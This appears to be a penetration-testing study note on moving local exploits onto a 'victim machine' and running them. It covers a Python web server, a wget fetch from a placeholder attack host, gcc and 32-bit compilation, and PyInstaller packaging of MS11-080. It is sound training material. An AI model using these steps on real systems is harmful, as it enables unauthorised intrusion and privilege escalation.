# Working with exploits

This section is mostly about local exploits, because they're annoying. Remote python exploits are usually point-and-shoot and web exploits have their own section.

## Transferring exploits

The quickest way to transfer an exploit is to create a folder for your exploits and expose it with Python's webserver:

```text
python -m SimpleHTTPServer 80
```

The port defaults to 8000 but 80 and 443 are usually more accessible, and wget will use 80 by default. Make sure your port choice doesn't conflict with your shell and don't leave the server running once you've served the exploit.

To download files to the victim machine:

```text
wget http://[attack machine]:[port]/exploit.c
```

Make sure you are in a writable directory,`/tmp/` is usually reliable.

## Compiling exploits

First, the usual warning about randomly downloading exploits from the internet: watch out for backdoors. [Exploit-DB](https://www.exploit-db.com/) is reliable.

Second, always read the exploit comments carefully:

* Compiler options to use
* Architecture of the victim machine \(32-bit or 64-bit\)
* Steps to complete on the victim machine
* Code modifications

Third, if you get error messages during compilation or runtime, google them. Usually this is because the binary was compiled on the attack machine and there are quirks in architecture that can be solved by modifying compile options.

### Basic technique

The compile command looks like this:

```text
gcc filename.c -o executablename
```

Before you can run it, you'll need to transfer it to the victim machine and give it the right permissions:

```text
chmod u+x executablename
```

To run the executable:

```text
./executablename
```

### 32-bit exploits

Sometimes the victim machine will be 32-bit and can't accept a 64-bit compiled binary. To determine the architecture of your target:

```text
uname -a
cat /proc/version
dpkg --print-architecture
arch
file /sbin/init
```

32-bit is usually represented by `i686` and 64-bit is usually represented by `x86_64`.

If a C compiler is missing or inaccessible on your victim machine, you can compile the exploits on your Kali machine but you need some extra libraries on Kali:

```text
apt-get install gcc-multilib
apt-get install g++-multilib
```

You will also need to add the `-m32` flag to your compile command.

### Python exploits

Python is readily available on Linux, but not on Windows. Interestingly, some popular Windows exploits, such as [MS11-080](https://www.exploit-db.com/exploits/18176/), are written in python \(why?\). To use these, you'll need to create a standalone executable from the python file. This is done by installing `PyWin32` on a Windows machine and then the `PyInstaller` module. 

Then create a Windows PE executable: 

```text
python pyinstaller.py --onefile ms11-080.py
```

